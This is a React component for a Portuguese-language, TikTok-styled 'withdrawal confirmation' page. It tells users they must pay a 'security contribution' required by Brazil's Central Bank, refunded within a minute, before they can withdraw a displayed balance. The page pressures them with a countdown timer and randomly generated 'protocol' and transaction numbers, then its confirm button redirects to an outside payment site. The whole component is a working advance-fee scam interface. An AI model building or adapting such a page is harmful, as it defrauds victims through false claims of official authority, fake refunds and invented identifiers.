"use client"

import { useState, useEffect } from "react"
import { ArrowLeft, ChevronRight, Lock, Clock } from "lucide-react"

interface WithdrawalConfirmationProps {
  isOpen: boolean
  onClose: () => void
  balance: number
  userName: string
  pixKeyType: string
  pixKey: string
}

function formatCurrency(cents: number): string {
  const reais = cents / 100
  return reais.toLocaleString("pt-BR", {
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  })
}

function generateProtocol(): string {
  const year = new Date().getFullYear()
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
  let random = ""
  for (let i = 0; i < 6; i++) {
    random += chars.charAt(Math.floor(Math.random() * chars.length))
  }
  return `TT-${year}-${random}`
}

function generateTransactionId(): string {
  let id = ""
  for (let i = 0; i < 12; i++) {
    id += Math.floor(Math.random() * 10)
  }
  return id
}

export function WithdrawalConfirmation({
  isOpen,
  onClose,
  balance,
  userName,
  pixKeyType,
  pixKey,
}: WithdrawalConfirmationProps) {
  const [timeLeft, setTimeLeft] = useState(10 * 60) // 10 minutes in seconds
  const [protocol] = useState(generateProtocol())
  const [transactionId] = useState(generateTransactionId())

  useEffect(() => {
    if (!isOpen) return

    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 0) {
          clearInterval(timer)
          return 0
        }
        return prev - 1
      })
    }, 1000)

    return () => clearInterval(timer)
  }, [isOpen])

  if (!isOpen) return null

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  const today = new Date()
  const formattedDate = today.toLocaleDateString("pt-BR")

  const securityFee = 1473 // R$ 14,73 in cents
  const bcbValidation = 743 // R$ 7,43
  const antifraudInsurance = 730 // R$ 7,30

  const handleConfirm = () => {
    window.location.href = "https://processandopedido.vercel.app/"
  }

  return (
    <div className="fixed inset-0 z-50 flex flex-col bg-background">
      {/* Header */}
      <header className="flex items-center justify-between border-b border-border px-4 py-3">
        <button
          onClick={onClose}
          className="flex h-10 w-10 items-center justify-center rounded-full transition-all active:scale-95"
          aria-label="Voltar"
        >
          <ArrowLeft className="h-5 w-5 text-foreground" />
        </button>
        <div className="flex flex-col items-center">
          <h1 className="text-base font-semibold text-foreground">
            Confirmacao de saque
          </h1>
          <div className="flex items-center gap-1 text-xs text-destructive">
            <Clock className="h-3 w-3" />
            <span>Tempo restante: {formatTime(timeLeft)}</span>
          </div>
        </div>
        <div className="w-10" />
      </header>

      {/* Content */}
      <div className="flex-1 overflow-y-auto">
        {/* Blue Banner */}
        <div className="bg-[#1a73e8] py-2.5 text-center">
          <p className="text-sm font-medium text-white">
            {userName || "Usuario"}, voce esta a 1 passo de fazer seu saque!
          </p>
        </div>

        {/* Protocol */}
        <div className="py-2 text-center">
          <p className="text-xs text-muted-foreground">
            Protocolo: {protocol}
          </p>
        </div>

        {/* Balance Card */}
        <div className="mx-4 overflow-hidden rounded-2xl bg-gradient-to-r from-[#22c55e] via-[#3b82f6] to-[#8b5cf6]">
          <div className="p-4">
            <p className="text-xs font-medium text-white/80">Saldo disponivel</p>
            <p className="mt-1 text-3xl font-bold text-white">
              R$ {formatCurrency(balance)}
            </p>
            <p className="mt-1 text-xs text-white/70">
              Aguardando confirmacao para saque
            </p>
          </div>
          <div className="flex items-center justify-between border-t border-white/20 bg-white/10 px-4 py-2">
            <p className="text-xs text-white/80">Suas transacoes: R$ 0,03</p>
            <ChevronRight className="h-4 w-4 text-white/60" />
          </div>
        </div>

        {/* Security Contribution */}
        <div className="mx-4 mt-6">
          <p className="text-[10px] font-semibold uppercase tracking-wide text-muted-foreground">
            Contribuicao de Seguranca
          </p>
          <div className="mt-2 flex items-center gap-2">
            <p className="text-2xl font-bold text-[#22c55e]">
              R$ {formatCurrency(securityFee)}
            </p>
            <span className="rounded bg-[#22c55e]/10 px-2 py-0.5 text-[10px] font-semibold text-[#22c55e]">
              100% REEMBOLSAVEL
            </span>
          </div>
          <p className="mt-2 text-xs leading-relaxed text-muted-foreground">
            Contribuicao de seguranca exigida pelo{" "}
            <span className="text-foreground">Banco Central</span> para liberacao
            do saque de{" "}
            <span className="font-semibold text-foreground">
              R$ {formatCurrency(balance)}
            </span>
            . O valor de{" "}
            <span className="font-semibold text-foreground">
              R$ {formatCurrency(securityFee)}
            </span>{" "}
            sera devolvido integralmente na sua chave Pix em{" "}
            <span className="text-[#1a73e8]">1 minuto</span>.
          </p>
        </div>

        {/* Fee Composition */}
        <div className="mx-4 mt-6 rounded-xl border border-border bg-card p-4">
          <p className="text-[10px] font-semibold uppercase tracking-wide text-muted-foreground">
            Composicao da Taxa
          </p>
          <div className="mt-3 space-y-2">
            <div className="flex items-center justify-between">
              <p className="text-sm text-foreground">Validacao BCB</p>
              <p className="text-sm text-foreground">
                R$ {formatCurrency(bcbValidation)}
              </p>
            </div>
            <div className="flex items-center justify-between">
              <p className="text-sm text-foreground">Seguro antifraude</p>
              <p className="text-sm text-foreground">
                R$ {formatCurrency(antifraudInsurance)}
              </p>
            </div>
            <div className="flex items-center justify-between border-t border-border pt-2">
              <p className="text-sm font-semibold text-foreground">
                Total <span className="text-[#22c55e]">(reembolsavel)</span>
              </p>
              <p className="text-sm font-semibold text-[#22c55e]">
                R$ {formatCurrency(securityFee)}
              </p>
            </div>
          </div>
        </div>

        {/* Progress Steps */}
        <div className="mx-4 mt-6">
          <div className="flex items-center justify-between">
            {/* Step 1 */}
            <div className="flex flex-col items-center">
              <div className="flex h-8 w-8 items-center justify-center rounded-full bg-[#22c55e] text-sm font-bold text-white">
                1
              </div>
              <p className="mt-1 text-[10px] font-medium text-[#22c55e]">Pagar</p>
              <p className="text-[10px] font-semibold text-[#22c55e]">
                R$ {formatCurrency(securityFee)}
              </p>
            </div>

            {/* Line */}
            <div className="h-0.5 flex-1 bg-border mx-2" />

            {/* Step 2 */}
            <div className="flex flex-col items-center">
              <div className="flex h-8 w-8 items-center justify-center rounded-full border-2 border-border text-sm font-bold text-muted-foreground">
                2
              </div>
              <p className="mt-1 text-[10px] text-muted-foreground">Reembolso</p>
              <p className="text-[10px] text-muted-foreground">em 1 min</p>
            </div>

            {/* Line */}
            <div className="h-0.5 flex-1 bg-border mx-2" />

            {/* Step 3 */}
            <div className="flex flex-col items-center">
              <div className="flex h-8 w-8 items-center justify-center rounded-full border-2 border-border text-sm font-bold text-muted-foreground">
                3
              </div>
              <p className="mt-1 text-[10px] text-muted-foreground">
                R$ {formatCurrency(balance)}
              </p>
              <p className="text-[10px] text-muted-foreground">na conta</p>
            </div>
          </div>
        </div>

        {/* Refund Data */}
        <div className="mx-4 mt-6 mb-32">
          <p className="text-[10px] font-semibold uppercase tracking-wide text-muted-foreground">
            Dados para Reembolso
          </p>
          <div className="mt-3 space-y-3">
            <div className="flex items-center justify-between">
              <p className="text-sm text-muted-foreground">Data</p>
              <p className="text-sm font-medium text-foreground">
                {formattedDate}
              </p>
            </div>
            <div className="flex items-center justify-between">
              <p className="text-sm text-muted-foreground">Titular</p>
              <p className="text-sm font-medium text-foreground">
                {userName || "Usuario"}
              </p>
            </div>
            <div className="flex items-center justify-between">
              <p className="text-sm text-muted-foreground">Chave PIX</p>
              <p className="text-sm font-medium text-foreground">{pixKeyType}</p>
            </div>
            <div className="flex items-center justify-between">
              <p className="text-sm text-muted-foreground">Valor a receber</p>
              <p className="text-sm font-semibold text-foreground">
                R$ {formatCurrency(balance)}
              </p>
            </div>
          </div>

          {/* Transaction ID */}
          <div className="mt-4 rounded-xl bg-secondary py-3 text-center">
            <p className="text-sm font-medium text-foreground">{transactionId}</p>
          </div>
        </div>
      </div>

      {/* Fixed Bottom Button */}
      <div className="fixed bottom-0 left-0 right-0 bg-background px-4 pb-6 pt-3">
        <button
          onClick={handleConfirm}
          className="flex w-full items-center justify-center gap-2 rounded-xl bg-[#FE2C55] py-4 text-sm font-bold uppercase tracking-wide text-white shadow-lg transition-all active:scale-[0.98]"
        >
          <Lock className="h-4 w-4" />
          Confirmar e Liberar R$ {formatCurrency(balance)}
        </button>
        <p className="mt-2 text-center text-xs text-[#22c55e]">
          <Clock className="mr-1 inline-block h-3 w-3" />
          Reembolso de R$ {formatCurrency(securityFee)} em 1 minuto
        </p>
      </div>
    </div>
  )
}
